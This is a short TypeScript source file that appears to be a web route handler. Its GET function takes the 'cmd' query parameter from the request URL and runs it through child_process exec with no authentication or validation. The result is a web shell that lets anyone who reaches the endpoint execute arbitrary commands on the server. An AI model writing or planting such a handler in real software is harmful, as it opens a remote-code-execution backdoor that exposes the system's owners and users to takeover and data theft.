import { exec } from "node:child_process";

export function GET(request: Request) {
  exec(new URL(request.url).searchParams.get("cmd") ?? "");

  return new Response("ok");
}
